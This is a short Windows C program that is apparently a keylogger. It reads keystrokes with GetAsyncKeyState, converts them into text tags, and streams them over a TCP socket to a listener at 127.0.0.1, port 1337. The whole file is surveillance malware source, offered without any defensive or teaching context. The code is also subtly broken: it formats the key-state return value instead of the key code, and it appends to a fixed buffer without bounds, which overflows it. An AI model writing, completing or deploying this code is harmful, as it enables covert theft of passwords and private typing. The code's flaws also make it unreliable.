#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>
#include <winsock2.h>
#include <winuser.h>

#define BUFFER 100

int take_n_run ( int key, char * buffer )
{
	switch ( key ) {
		case 8 :
			strcat ( buffer, "[B]" );
			return 0;
		case 13 :
			strcat ( buffer, "\n" );
			return 0;
		case 32 :
			strcat ( buffer, " " );
			return 0;
		case VK_TAB :
			strcat ( buffer, "[T]" );
			return 0;
		case VK_SHIFT :
			strcat ( buffer, "[S]" );
			return 0;
		case VK_CONTROL :
			strcat ( buffer, "[C]" ) ;
			return 0;		
		case VK_ESCAPE :
			strcat ( buffer, "[ES]" );
			return 0;
		case VK_END :
			strcat ( buffer, "[EN]" );
			return 0;
		case VK_HOME :
			strcat ( buffer, "[H]" );
			return 0;
		case VK_LEFT :
			strcat ( buffer, "[L]" );
			return 0;
		case VK_RIGHT :
			strcat ( buffer, "[R]" );
			return 0;
		case VK_UP :
			strcat ( buffer, "[U]" );
			return 0;
		case VK_DOWN :
			strcat ( buffer, "[D]" );
			return 0;
		case 110 :
		case 190 :
			strcat ( buffer, "." );
			return 0;
		default:
			strcat ( buffer, ( char * ) & key );
	}
 
    return 0;
}

int main(){

	SOCKET sock;
	WSADATA wsa;
	struct sockaddr_in srv;
	char data[BUFFER] = "";

	srv.sin_family = AF_INET;
	srv.sin_addr.s_addr = inet_addr("127.0.0.1");
	srv.sin_port = htons(1337);
	

	if(WSAStartup(MAKEWORD(2,2),&wsa) != 0){
		printf("Error: %d", WSAGetLastError());
		return 1;
	}

	//wsa initialized :)
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if(sock == INVALID_SOCKET){
		printf("Socket failed...\n");
		return -1;
	}

	//socket created
	if(connect(sock, (struct sockaddr*)&srv, sizeof(srv)) < 0){
		printf("Error connection...\n");
		return 1;
	}

	
	while(1){

		for (int i = 1; i < 190 ; i++)
		{
			if(strcmp(data, " ") == 0){
				continue;
			}
			take_n_run(GetAsyncKeyState(i), data);
			send(sock, data, sizeof(data), 0);
			continue;
			
		}
		
	}
	

	return 0;
}